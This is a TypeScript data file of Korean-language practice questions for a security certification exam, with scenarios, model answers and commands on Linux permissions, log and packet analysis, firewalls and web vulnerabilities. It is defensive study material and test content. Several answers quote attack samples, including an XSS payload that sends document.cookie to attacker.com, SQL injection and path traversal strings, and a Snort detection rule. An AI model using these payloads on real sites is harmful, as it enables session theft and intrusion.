import type { PracticalSubject } from "@/types";

export interface HandsOnQuestion {
  question: string;
  scenario?: string;
  answer: string;
  command?: string;
  keywords: string[];
  subject: PracticalSubject;
}

export const allHandsOn: HandsOnQuestion[] = [
  // ========================================
  // 1. 시스템 보안 (system-security) ~12문제
  // ========================================
  {
    question:
      "다음 파일의 권한이 4755일 때, 각 숫자가 의미하는 바를 설명하고 이 권한이 설정된 대표적인 파일을 답하시오.",
    scenario: `-rwsr-xr-x 1 root root 54256 /usr/bin/passwd`,
    answer:
      "4는 SetUID 특수 권한, 7은 소유자(rwx), 5는 그룹(r-x), 5는 기타 사용자(r-x)를 의미한다. SetUID가 설정되면 실행 시 파일 소유자(root)의 권한으로 실행된다. 대표적인 파일은 /usr/bin/passwd이다.",
    command: "chmod 4755 /usr/bin/passwd",
    keywords: ["SetUID", "특수권한", "chmod", "4755", "passwd"],
    subject: "system-security",
  },
  {
    question:
      "다음 chmod 명령의 결과로 설정되는 권한을 8진수와 심볼릭으로 각각 표현하시오.",
    scenario: `chmod 2755 /usr/bin/wall`,
    answer:
      "8진수: 2755, 심볼릭: -rwxr-sr-x. 2는 SetGID 특수 권한을 의미하며, 실행 시 파일 소유 그룹의 권한으로 실행된다. 그룹 실행 권한 자리에 's'가 표시된다.",
    keywords: ["SetGID", "2755", "chmod", "특수권한"],
    subject: "system-security",
  },
  {
    question:
      "다음 디렉터리 권한 1777의 의미를 설명하고, 이 권한이 설정된 대표적인 디렉터리를 답하시오.",
    scenario: `drwxrwxrwt 10 root root 4096 Apr 6 09:00 /tmp`,
    answer:
      "1은 Sticky Bit 특수 권한을 의미한다. Sticky Bit가 설정된 디렉터리에서는 파일 소유자와 root만 해당 파일을 삭제할 수 있다. 대표적인 디렉터리는 /tmp이다. 기타 사용자 실행 권한 자리에 't'가 표시된다.",
    command: "chmod 1777 /tmp",
    keywords: ["Sticky Bit", "1777", "/tmp", "특수권한"],
    subject: "system-security",
  },
  {
    question:
      "다음 /etc/passwd 파일 내용에서 보안상 문제가 되는 계정을 찾고 이유를 설명하시오.",
    scenario: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
hacker:x:0:0::/home/hacker:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`,
    answer:
      "hacker 계정이 보안상 문제가 된다. UID가 0으로 설정되어 있어 root와 동일한 권한을 가진다. UID 0은 시스템에서 root 사용자에게만 할당되어야 하며, 일반 사용자가 UID 0을 가지면 시스템 전체에 대한 관리자 권한을 갖게 된다.",
    command: "awk -F: '$3 == 0 {print $1}' /etc/passwd",
    keywords: ["UID 0", "/etc/passwd", "비정상 계정", "권한 상승"],
    subject: "system-security",
  },
  {
    question:
      "다음 /etc/shadow 파일의 각 필드가 의미하는 바를 설명하시오.",
    scenario: `testuser:$6$rounds=5000$saltsalt$hashvalue:19458:0:99999:7:30::`,
    answer:
      "필드 구조: 사용자명:암호화된패스워드:마지막변경일:최소변경일수:최대사용일수:경고일수:비활성일수:계정만료일:예약필드. testuser 계정은 SHA-512($6$) 해시를 사용하며, 마지막 패스워드 변경은 1970년 1월 1일 기준 19458일째(2023년 4월경), 최소 0일 후 변경 가능, 최대 99999일 사용 가능, 만료 7일 전 경고, 만료 후 30일간 비활성 상태이다.",
    keywords: ["/etc/shadow", "SHA-512", "$6$", "패스워드 해시", "계정 관리"],
    subject: "system-security",
  },
  {
    question:
      "다음 crontab 설정의 실행 주기를 설명하고, 매주 월요일 오전 3시에 백업 스크립트를 실행하는 crontab 설정을 작성하시오.",
    scenario: `*/5 * * * * /usr/local/bin/check_health.sh
0 2 * * 0 /usr/local/bin/weekly_backup.sh
30 1 1,15 * * /usr/local/bin/bimonthly_report.sh`,
    answer:
      "첫 번째: 매 5분마다 check_health.sh 실행. 두 번째: 매주 일요일 오전 2시에 weekly_backup.sh 실행. 세 번째: 매월 1일과 15일 오전 1시 30분에 bimonthly_report.sh 실행. 매주 월요일 오전 3시 백업 설정: 0 3 * * 1 /usr/local/bin/backup.sh",
    command: "0 3 * * 1 /usr/local/bin/backup.sh",
    keywords: ["crontab", "크론탭", "스케줄링", "주기 실행"],
    subject: "system-security",
  },
  {
    question:
      "다음 iptables 규칙을 분석하고, 외부에서 SSH(22번 포트) 접속을 차단하는 규칙을 추가 작성하시오.",
    scenario: `iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p icmp -j DROP
iptables -P INPUT DROP`,
    answer:
      "분석: TCP 80(HTTP)과 443(HTTPS) 포트 인바운드 허용, 기존 연결 및 관련 연결 허용, ICMP(ping) 차단, 기본 정책은 모든 인바운드 차단(DROP). SSH 차단 규칙: iptables -A INPUT -p tcp --dport 22 -j DROP (기본 정책이 DROP이므로 별도 추가하지 않아도 차단되나 명시적으로 추가할 수 있다.)",
    command: "iptables -A INPUT -p tcp --dport 22 -j DROP",
    keywords: ["iptables", "방화벽", "INPUT", "DROP", "SSH"],
    subject: "system-security",
  },
  {
    question:
      "다음 명령어를 이용하여 시스템에서 SetUID가 설정된 파일을 찾는 명령어를 완성하고, 결과에서 비정상적인 파일을 식별하시오.",
    scenario: `$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/tmp/.hidden/backdoor
/usr/bin/pkexec`,
    answer:
      "/tmp/.hidden/backdoor 파일이 비정상적이다. /tmp 디렉터리에 숨김 폴더(.hidden) 내에 SetUID가 설정된 파일이 존재하는 것은 백도어일 가능성이 높다. SetUID 파일은 실행 시 파일 소유자 권한으로 실행되므로 root 소유의 SetUID 파일은 권한 상승 공격에 사용될 수 있다.",
    command: "find / -perm -4000 -type f 2>/dev/null",
    keywords: ["find", "SetUID", "-perm", "4000", "백도어"],
    subject: "system-security",
  },
  {
    question:
      "다음 last 명령어 출력을 분석하여 보안상 의심스러운 활동을 식별하시오.",
    scenario: `$ last -5
admin    pts/0    192.168.1.100    Mon Apr  6 09:00   still logged in
root     pts/1    10.0.0.55        Sun Apr  5 03:22 - 03:45  (00:23)
admin    pts/0    192.168.1.100    Sat Apr  4 08:30 - 17:00  (08:30)
root     tty1                      Sat Apr  4 03:15 - 03:18  (00:03)
root     pts/2    218.145.33.12    Fri Apr  3 02:10 - 02:35  (00:25)`,
    answer:
      "의심스러운 활동: 1) root 계정으로 외부 IP(218.145.33.12)에서 새벽 2시에 원격 접속이 발생했다. 2) root 계정 원격 접속이 새벽 시간대에 반복적으로 발생한다. 3) root 계정은 원격 접속을 금지하고 일반 계정으로 접속 후 su/sudo를 사용해야 한다. /etc/ssh/sshd_config에서 PermitRootLogin no로 설정하여 root 원격 접속을 차단해야 한다.",
    command: "last -f /var/log/wtmp",
    keywords: ["last", "wtmp", "로그인 기록", "root 원격접속", "보안 감사"],
    subject: "system-security",
  },
  {
    question:
      "다음 ps aux 출력에서 비정상적인 프로세스를 찾고 대응 방안을 서술하시오.",
    scenario: `$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 169356 13120 ?        Ss   Apr05   0:03 /sbin/init
root       512  0.0  0.0  72308  6212 ?        Ss   Apr05   0:00 /usr/sbin/sshd
www-data  1024  0.0  0.2 274420 18560 ?        S    Apr05   0:05 /usr/sbin/apache2
root      2048 98.5  0.1  15432  8320 ?        R    03:22   5:43 /tmp/.x/miner -o stratum+tcp://pool.crypto.com:3333
nobody    3001  0.0  0.0   4508   780 ?        S    Apr05   0:00 /usr/sbin/xinetd`,
    answer:
      "PID 2048 프로세스가 비정상적이다. /tmp 디렉터리의 숨김 폴더에서 실행 중이며, CPU 사용률이 98.5%로 비정상적으로 높고, 암호화폐 마이닝 풀(pool.crypto.com:3333)에 접속하는 채굴 악성코드로 판단된다. 대응: 1) kill -9 2048로 프로세스 종료, 2) rm -rf /tmp/.x/ 로 악성파일 삭제, 3) 침입 경로 분석, 4) 시스템 무결성 점검.",
    command: "kill -9 2048 && rm -rf /tmp/.x/",
    keywords: ["ps aux", "비정상 프로세스", "암호화폐 채굴", "악성코드"],
    subject: "system-security",
  },
  {
    question:
      "umask 값이 027일 때, 새로 생성되는 파일과 디렉터리의 기본 권한을 계산하시오.",
    scenario: `$ umask
0027
$ touch newfile.txt
$ mkdir newdir`,
    answer:
      "파일 기본 권한: 666 - 027 = 640 (-rw-r-----). 디렉터리 기본 권한: 777 - 027 = 750 (drwxr-x---). 파일은 기본 생성 권한 666에서 umask를 빼고, 디렉터리는 기본 생성 권한 777에서 umask를 뺀다. 소유자는 읽기/쓰기(파일) 또는 전체(디렉터리), 그룹은 읽기(파일) 또는 읽기/실행(디렉터리), 기타 사용자는 권한 없음.",
    command: "umask 027",
    keywords: ["umask", "기본 권한", "파일 권한", "디렉터리 권한"],
    subject: "system-security",
  },
  {
    question:
      "다음 Apache 접근 로그에서 공격 유형을 식별하고 대응 방안을 서술하시오.",
    scenario: `192.168.1.50 - - [06/Apr/2026:10:15:01 +0900] "GET /index.php HTTP/1.1" 200 1523
192.168.1.50 - - [06/Apr/2026:10:15:02 +0900] "GET /admin/ HTTP/1.1" 403 287
192.168.1.50 - - [06/Apr/2026:10:15:03 +0900] "GET /phpmyadmin/ HTTP/1.1" 404 274
192.168.1.50 - - [06/Apr/2026:10:15:03 +0900] "GET /wp-admin/ HTTP/1.1" 404 274
192.168.1.50 - - [06/Apr/2026:10:15:04 +0900] "GET /administrator/ HTTP/1.1" 404 274
192.168.1.50 - - [06/Apr/2026:10:15:05 +0900] "GET /manager/html HTTP/1.1" 404 274
192.168.1.50 - - [06/Apr/2026:10:15:05 +0900] "GET /console/ HTTP/1.1" 404 274
192.168.1.50 - - [06/Apr/2026:10:15:06 +0900] "GET /.env HTTP/1.1" 404 274`,
    answer:
      "디렉터리 스캐닝(Directory Brute Force) 공격이다. 동일 IP(192.168.1.50)에서 짧은 시간 내에 관리자 페이지 경로(/admin, /phpmyadmin, /wp-admin, /administrator, /manager/html)를 연속적으로 탐색하고 있다. 대응: 1) 해당 IP를 iptables로 차단, 2) 웹 서버에 접근 제한(IP 기반) 설정, 3) fail2ban 등으로 자동 차단 설정, 4) 불필요한 관리자 경로에 대한 접근 제한.",
    command: "iptables -A INPUT -s 192.168.1.50 -j DROP",
    keywords: ["디렉터리 스캐닝", "웹 로그 분석", "Apache", "브루트포스"],
    subject: "system-security",
  },

  // ========================================
  // 2. 네트워크 보안 (network-security) ~12문제
  // ========================================
  {
    question:
      "다음 tcpdump 출력에서 공격 유형을 식별하고 대응 방안을 서술하시오.",
    scenario: `09:15:01.123456 IP 10.0.0.1.12345 > 192.168.1.10.80: Flags [S], seq 1000, win 512
09:15:01.123457 IP 10.0.0.1.12346 > 192.168.1.10.80: Flags [S], seq 1001, win 512
09:15:01.123458 IP 10.0.0.1.12347 > 192.168.1.10.80: Flags [S], seq 1002, win 512
09:15:01.123459 IP 10.0.0.1.12348 > 192.168.1.10.80: Flags [S], seq 1003, win 512
09:15:01.123460 IP 10.0.0.1.12349 > 192.168.1.10.80: Flags [S], seq 1004, win 512
... (초당 수천 건의 SYN 패킷 발생)`,
    answer:
      "SYN Flood 공격이다. 동일 출발지에서 대상 서버(192.168.1.10)의 80번 포트로 대량의 SYN 패킷만 전송하고 있다. TCP 3-way handshake를 완료하지 않아 서버의 백로그 큐(Backlog Queue)를 소진시키는 DoS 공격이다. 대응: 1) SYN Cookie 활성화(sysctl -w net.ipv4.tcp_syncookies=1), 2) 백로그 큐 크기 증가, 3) 방화벽에서 임계치 기반 차단, 4) IPS를 이용한 탐지/차단.",
    command: "sysctl -w net.ipv4.tcp_syncookies=1",
    keywords: ["SYN Flood", "DoS", "tcpdump", "SYN Cookie", "백로그 큐"],
    subject: "network-security",
  },
  {
    question:
      "다음 Snort 룰을 분석하고, HTTP 서버로의 SQL Injection 공격을 탐지하는 룰을 작성하시오.",
    scenario: `alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"웹 서버 디렉터리 트래버설 탐지"; content:"../"; nocase; sid:1000001; rev:1;)`,
    answer:
      "분석: 외부 네트워크에서 내부 네트워크 80번 포트로의 TCP 트래픽 중 '../' 문자열(대소문자 무시)을 포함하는 패킷을 탐지하여 경고한다. SQL Injection 탐지 룰: alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:\"SQL Injection 공격 탐지\"; content:\"union\"; nocase; content:\"select\"; nocase; sid:1000002; rev:1;)",
    command:
      'alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"SQL Injection 공격 탐지"; content:"union"; nocase; content:"select"; nocase; sid:1000002; rev:1;)',
    keywords: ["Snort", "IDS", "룰", "탐지 규칙", "SQL Injection"],
    subject: "network-security",
  },
  {
    question:
      "다음 tcpdump 출력에서 ARP Spoofing 공격이 발생하고 있는지 판단하고 근거를 제시하시오.",
    scenario: `09:20:01.000 ARP, Reply 192.168.1.1 is-at aa:bb:cc:dd:ee:01, length 28
09:20:01.500 ARP, Reply 192.168.1.1 is-at aa:bb:cc:dd:ee:01, length 28
09:20:02.000 ARP, Reply 192.168.1.1 is-at 11:22:33:44:55:66, length 28
09:20:02.500 ARP, Reply 192.168.1.1 is-at 11:22:33:44:55:66, length 28
09:20:03.000 ARP, Reply 192.168.1.1 is-at 11:22:33:44:55:66, length 28`,
    answer:
      "ARP Spoofing 공격이 발생하고 있다. 동일한 IP(192.168.1.1, 게이트웨이)에 대해 두 개의 서로 다른 MAC 주소(aa:bb:cc:dd:ee:01, 11:22:33:44:55:66)가 응답하고 있다. 공격자(11:22:33:44:55:66)가 게이트웨이를 사칭하여 ARP Reply를 지속적으로 전송하는 중간자 공격(MITM)이다. 대응: 1) 정적 ARP 테이블 설정, 2) ARP 감시 도구(arpwatch) 사용, 3) Dynamic ARP Inspection(DAI) 활성화.",
    command: "arp -s 192.168.1.1 aa:bb:cc:dd:ee:01",
    keywords: ["ARP Spoofing", "MITM", "MAC 주소", "ARP Reply", "arpwatch"],
    subject: "network-security",
  },
  {
    question:
      "다음 netstat 출력에서 보안상 문제가 되는 항목을 식별하고 조치 방안을 제시하시오.",
    scenario: `$ netstat -tlnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      512/sshd
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1024/apache2
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      2048/mysqld
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      3001/telnetd
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      3050/vsftpd
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      9999/nc`,
    answer:
      "보안 문제: 1) Telnet(23번 포트)이 활성화되어 있다. 평문 통신으로 패스워드 노출 위험이 있으므로 SSH로 대체해야 한다. 2) MySQL(3306번 포트)이 0.0.0.0으로 바인딩되어 모든 IP에서 접속 가능하다. 127.0.0.1로 변경해야 한다. 3) 4444번 포트에서 nc(netcat)가 리스닝 중이다. 백도어로 의심되므로 즉시 프로세스를 종료하고 침입 경로를 분석해야 한다.",
    command: "kill -9 9999 && systemctl stop telnetd && systemctl disable telnetd",
    keywords: ["netstat", "포트 스캐닝", "Telnet", "백도어", "netcat"],
    subject: "network-security",
  },
  {
    question:
      "다음 nmap 스캔 결과를 해석하고, 해당 호스트의 보안 조치 사항을 서술하시오.",
    scenario: `$ nmap -sV 192.168.1.10
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.10
Host is up (0.001s latency).
Not shown: 993 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu
25/tcp   open     smtp        Postfix smtpd
80/tcp   open     http        Apache httpd 2.4.18
111/tcp  open     rpcbind     2-4 (RPC #100000)
443/tcp  open     ssl/https   Apache httpd 2.4.18
3306/tcp open     mysql       MySQL 5.7.33
8080/tcp filtered http-proxy`,
    answer:
      "보안 조치 사항: 1) OpenSSH 7.2p2는 취약점이 존재하는 구버전이므로 최신 버전으로 업데이트 필요. 2) SMTP(25번 포트) Postfix가 외부 노출되어 있어 오픈 릴레이 악용 가능성 확인 필요. 3) rpcbind(111번 포트)는 불필요 시 비활성화 필요. 4) MySQL(3306번 포트)이 외부에 노출되어 있어 방화벽으로 접근 제한 필요. 5) Apache 2.4.18은 구버전으로 업데이트 필요.",
    keywords: ["nmap", "포트 스캔", "서비스 버전", "취약점", "보안 점검"],
    subject: "network-security",
  },
  {
    question:
      "다음 arp -a 결과에서 ARP Spoofing 여부를 판단하시오.",
    scenario: `$ arp -a
gateway (192.168.1.1) at aa:bb:cc:dd:ee:01 [ether] on eth0
server (192.168.1.10) at aa:bb:cc:dd:ee:10 [ether] on eth0
workstation (192.168.1.20) at aa:bb:cc:dd:ee:01 [ether] on eth0
printer (192.168.1.30) at aa:bb:cc:dd:ee:30 [ether] on eth0`,
    answer:
      "ARP Spoofing이 의심된다. gateway(192.168.1.1)와 workstation(192.168.1.20)의 MAC 주소가 동일하게 aa:bb:cc:dd:ee:01이다. 서로 다른 IP 주소가 동일한 MAC 주소를 가지는 것은 ARP Spoofing의 전형적인 징후이다. workstation이 게이트웨이를 사칭하거나, 게이트웨이가 workstation을 사칭하고 있을 수 있다.",
    command: "arpwatch -i eth0",
    keywords: ["ARP Spoofing", "MAC 주소 중복", "arp -a", "MITM"],
    subject: "network-security",
  },
  {
    question:
      "다음 라우팅 테이블을 분석하고 각 경로의 의미를 설명하시오.",
    scenario: `$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
10.10.0.0       192.168.1.254   255.255.0.0     UG    0      0        0 eth0
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
172.16.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth1`,
    answer:
      "1) 0.0.0.0/0.0.0.0: 기본 게이트웨이(Default Gateway)로 192.168.1.1을 통해 외부 네트워크로 전달. 2) 10.10.0.0/255.255.0.0: 10.10.0.0/16 네트워크로의 트래픽은 192.168.1.254 게이트웨이를 통해 전달. 3) 192.168.1.0/255.255.255.0: 192.168.1.0/24 네트워크는 eth0 인터페이스에 직접 연결(Gateway 0.0.0.0). 4) 172.16.0.0/255.255.0.0: 172.16.0.0/16 네트워크는 eth1 인터페이스에 직접 연결.",
    keywords: ["라우팅 테이블", "기본 게이트웨이", "route", "서브넷"],
    subject: "network-security",
  },
  {
    question:
      "다음 DNS 질의 결과를 분석하고, DNS 캐시 포이즈닝 공격 여부를 판단하시오.",
    scenario: `$ dig www.example-bank.com

;; ANSWER SECTION:
www.example-bank.com.   30      IN      A       10.0.0.99

$ nslookup www.example-bank.com 8.8.8.8
Server:   8.8.8.8
Address:  8.8.8.8#53

Name:     www.example-bank.com
Address:  203.0.113.50`,
    answer:
      "DNS 캐시 포이즈닝(DNS Cache Poisoning)이 의심된다. 로컬 DNS 서버에서 조회한 결과(10.0.0.99)와 구글 공개 DNS(8.8.8.8)에서 조회한 결과(203.0.113.50)가 다르다. 로컬 DNS에 위조된 레코드가 캐시되어 내부 IP(10.0.0.99)로 유도하는 파밍(Pharming) 공격이 발생했을 가능성이 높다. TTL이 30초로 매우 짧은 것도 의심 징후이다. 대응: 로컬 DNS 캐시 초기화, DNSSEC 적용.",
    command: "rndc flush",
    keywords: ["DNS 캐시 포이즈닝", "파밍", "dig", "nslookup", "DNSSEC"],
    subject: "network-security",
  },
  {
    question:
      "다음 Wireshark 디스플레이 필터의 의미를 설명하고, HTTP POST 요청 중 특정 문자열을 포함하는 패킷을 검색하는 필터를 작성하시오.",
    scenario: `tcp.port == 80 && ip.src == 192.168.1.0/24
http.request.method == "GET" && http.request.uri contains "admin"
tcp.flags.syn == 1 && tcp.flags.ack == 0`,
    answer:
      "1) 출발지가 192.168.1.0/24 대역이고 TCP 80번 포트인 패킷. 2) HTTP GET 요청 중 URI에 'admin'이 포함된 패킷. 3) SYN 플래그만 설정된 패킷(TCP 연결 시작 요청). HTTP POST 요청 중 'password' 문자열 검색 필터: http.request.method == \"POST\" && frame contains \"password\"",
    command: 'http.request.method == "POST" && frame contains "password"',
    keywords: ["Wireshark", "디스플레이 필터", "패킷 분석", "HTTP"],
    subject: "network-security",
  },
  {
    question:
      "다음 방화벽 ACL(Access Control List) 규칙을 분석하고, DMZ의 웹 서버(10.0.1.10)에 대해 외부에서 HTTPS만 허용하는 규칙을 추가하시오.",
    scenario: `access-list 100 permit tcp any host 10.0.1.10 eq 80
access-list 100 permit tcp host 192.168.1.0 0.0.0.255 host 10.0.1.10 eq 22
access-list 100 deny ip any host 10.0.1.10
access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 80
access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 443
access-list 100 deny ip any any`,
    answer:
      "분석: 1) 모든 출발지에서 10.0.1.10의 HTTP(80) 허용. 2) 내부 네트워크(192.168.1.0/24)에서 10.0.1.10의 SSH(22) 허용. 3) 그 외 10.0.1.10으로의 모든 접근 차단. 4-5) 내부 네트워크에서 외부 HTTP/HTTPS 허용. 6) 나머지 모두 차단. HTTPS 허용 추가: access-list 100 permit tcp any host 10.0.1.10 eq 443 (첫 번째 규칙 다음에 삽입)",
    command: "access-list 100 permit tcp any host 10.0.1.10 eq 443",
    keywords: ["ACL", "방화벽", "접근제어 목록", "DMZ", "HTTPS"],
    subject: "network-security",
  },
  {
    question:
      "다음 IPSec 설정을 분석하고 각 항목의 의미를 설명하시오.",
    scenario: `crypto isakmp policy 10
  encryption aes 256
  hash sha256
  authentication pre-share
  group 14
  lifetime 86400

crypto ipsec transform-set MY_TS esp-aes 256 esp-sha256-hmac
  mode tunnel

crypto map MY_MAP 10 ipsec-isakmp
  set peer 203.0.113.1
  set transform-set MY_TS
  match address VPN_ACL`,
    answer:
      "IKE Phase 1 정책(ISAKMP): AES-256 암호화, SHA-256 해시, 사전공유키(PSK) 인증, DH 그룹 14(2048비트), SA 수명 86400초(24시간). IKE Phase 2(IPSec 변환 세트): ESP 프로토콜 사용, AES-256 암호화, SHA-256 HMAC 무결성 검증, 터널 모드. 크립토 맵: 피어 주소 203.0.113.1, MY_TS 변환 세트 적용, VPN_ACL에 매칭되는 트래픽에 적용.",
    keywords: ["IPSec", "IKE", "ISAKMP", "ESP", "터널 모드", "VPN"],
    subject: "network-security",
  },
  {
    question:
      "다음 tcpdump 출력에서 발생하고 있는 공격 유형을 식별하고 특징을 설명하시오.",
    scenario: `09:30:01.100 IP 192.168.1.50.45678 > 10.0.0.1.22: Flags [S], seq 100
09:30:01.200 IP 192.168.1.50.45679 > 10.0.0.1.23: Flags [S], seq 200
09:30:01.300 IP 192.168.1.50.45680 > 10.0.0.1.25: Flags [S], seq 300
09:30:01.400 IP 192.168.1.50.45681 > 10.0.0.1.53: Flags [S], seq 400
09:30:01.500 IP 192.168.1.50.45682 > 10.0.0.1.80: Flags [S], seq 500
09:30:01.600 IP 192.168.1.50.45683 > 10.0.0.1.110: Flags [S], seq 600
09:30:01.700 IP 192.168.1.50.45684 > 10.0.0.1.443: Flags [S], seq 700
09:30:01.800 IP 192.168.1.50.45685 > 10.0.0.1.3306: Flags [S], seq 800`,
    answer:
      "TCP 포트 스캐닝(Port Scanning) 공격이다. nmap의 TCP SYN 스캔(Half-Open Scan)과 유사하다. 동일 출발지(192.168.1.50)에서 대상 서버(10.0.0.1)의 여러 포트(22, 23, 25, 53, 80, 110, 443, 3306)에 순차적으로 SYN 패킷을 전송하여 열린 포트를 탐색하고 있다. 대응: 1) IDS/IPS에서 포트 스캔 탐지 룰 설정, 2) 방화벽에서 해당 IP 차단, 3) 불필요한 포트 서비스 비활성화.",
    keywords: ["포트 스캐닝", "TCP SYN 스캔", "nmap", "정보 수집"],
    subject: "network-security",
  },

  // ========================================
  // 3. 어플리케이션 보안 (application-security) ~10문제
  // ========================================
  {
    question:
      "다음 PHP 코드에서 SQL Injection 취약점을 찾고 안전한 코드로 수정하시오.",
    scenario: `<?php
$conn = mysqli_connect("localhost", "root", "password", "mydb");
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_assoc($result);
echo "사용자: " . $row['username'];
?>`,
    answer:
      "취약점: 사용자 입력값($_GET['id'])을 직접 SQL 쿼리에 삽입하여 SQL Injection이 가능하다. 예: id=1' OR '1'='1 입력 시 모든 사용자 정보 노출. 수정: Prepared Statement(매개변수화 쿼리)를 사용해야 한다. $stmt = mysqli_prepare($conn, \"SELECT * FROM users WHERE id = ?\"); mysqli_stmt_bind_param($stmt, \"s\", $_GET['id']); mysqli_stmt_execute($stmt);",
    command: `$stmt = mysqli_prepare($conn, "SELECT * FROM users WHERE id = ?");
mysqli_stmt_bind_param($stmt, "s", $_GET['id']);
mysqli_stmt_execute($stmt);`,
    keywords: ["SQL Injection", "Prepared Statement", "매개변수화 쿼리", "PHP"],
    subject: "application-security",
  },
  {
    question:
      "다음 Java 코드에서 SQL Injection 취약점을 찾고 수정 방안을 제시하시오.",
    scenario: `String userId = request.getParameter("userId");
String query = "SELECT * FROM users WHERE user_id = '" + userId + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);`,
    answer:
      "취약점: 사용자 입력(userId)을 문자열 결합으로 SQL에 삽입하여 SQL Injection이 가능하다. 수정: PreparedStatement를 사용한다. String query = \"SELECT * FROM users WHERE user_id = ?\"; PreparedStatement pstmt = conn.prepareStatement(query); pstmt.setString(1, userId); ResultSet rs = pstmt.executeQuery();",
    command: `String query = "SELECT * FROM users WHERE user_id = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, userId);
ResultSet rs = pstmt.executeQuery();`,
    keywords: ["SQL Injection", "PreparedStatement", "Java", "바인드 변수"],
    subject: "application-security",
  },
  {
    question:
      "다음 코드에서 XSS(Cross-Site Scripting) 취약점을 찾고 대응 방안을 서술하시오.",
    scenario: `<!-- 게시판 글 표시 -->
<div class="post-content">
  <?php echo $_GET['keyword']; ?>
</div>

<!-- 검색 결과 표시 -->
<p>검색어: <?php echo $keyword; ?> 에 대한 결과입니다.</p>`,
    answer:
      "취약점: 사용자 입력값을 HTML 이스케이프 처리 없이 그대로 출력하여 Reflected XSS가 가능하다. 공격자가 keyword=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>를 삽입하면 쿠키 탈취가 가능하다. 수정: htmlspecialchars() 함수로 출력 값을 이스케이프한다. <?php echo htmlspecialchars($_GET['keyword'], ENT_QUOTES, 'UTF-8'); ?>",
    command:
      "<?php echo htmlspecialchars($_GET['keyword'], ENT_QUOTES, 'UTF-8'); ?>",
    keywords: ["XSS", "Reflected XSS", "htmlspecialchars", "이스케이프"],
    subject: "application-security",
  },
  {
    question:
      "다음 Apache 웹 로그에서 공격 유형을 각각 식별하시오.",
    scenario: `192.168.1.100 - - [06/Apr/2026:14:22:01 +0900] "GET /login.php?id=admin'%20OR%20'1'%3D'1'--%20 HTTP/1.1" 200 3521
192.168.1.101 - - [06/Apr/2026:14:22:05 +0900] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 1502
192.168.1.102 - - [06/Apr/2026:14:22:10 +0900] "GET /download?file=../../../etc/passwd HTTP/1.1" 200 1283
192.168.1.103 - - [06/Apr/2026:14:22:15 +0900] "GET /page?url=http://evil.com/phishing HTTP/1.1" 302 0`,
    answer:
      "1) SQL Injection 공격: admin' OR '1'='1'-- 구문으로 인증 우회 시도. 2) XSS(Cross-Site Scripting) 공격: <script>alert('xss')</script> 삽입으로 스크립트 실행 시도. 3) 디렉터리 트래버설(Path Traversal) 공격: ../../../etc/passwd로 시스템 파일 접근 시도. 4) SSRF(Server-Side Request Forgery) 또는 오픈 리다이렉트 공격: 외부 악성 URL로 리다이렉션 유도.",
    keywords: [
      "SQL Injection",
      "XSS",
      "디렉터리 트래버설",
      "SSRF",
      "웹 로그 분석",
    ],
    subject: "application-security",
  },
  {
    question:
      "다음 Apache httpd.conf 설정의 보안상 문제점을 찾고 수정하시오.",
    scenario: `ServerTokens Full
ServerSignature On
Options Indexes FollowSymLinks
TraceEnable On
<Directory "/var/www/html">
    AllowOverride All
    Require all granted
</Directory>`,
    answer:
      "보안 문제 및 수정: 1) ServerTokens Full → ServerTokens Prod: 서버 버전 정보 노출을 최소화. 2) ServerSignature On → ServerSignature Off: 에러 페이지에 서버 정보 표시 제거. 3) Options Indexes → Options -Indexes: 디렉터리 리스팅(목록 노출) 비활성화. 4) TraceEnable On → TraceEnable Off: HTTP TRACE 메소드 비활성화(XST 공격 방지). 5) AllowOverride All은 필요한 옵션만 허용하도록 제한.",
    command: `ServerTokens Prod
ServerSignature Off
Options -Indexes +FollowSymLinks
TraceEnable Off`,
    keywords: [
      "Apache",
      "httpd.conf",
      "ServerTokens",
      "디렉터리 리스팅",
      "보안 설정",
    ],
    subject: "application-security",
  },
  {
    question:
      "다음 php.ini 설정에서 보안상 문제가 되는 항목을 찾고 권장 설정값을 제시하시오.",
    scenario: `register_globals = On
allow_url_fopen = On
allow_url_include = On
display_errors = On
expose_php = On
session.cookie_httponly = Off
session.cookie_secure = Off
upload_max_filesize = 100M`,
    answer:
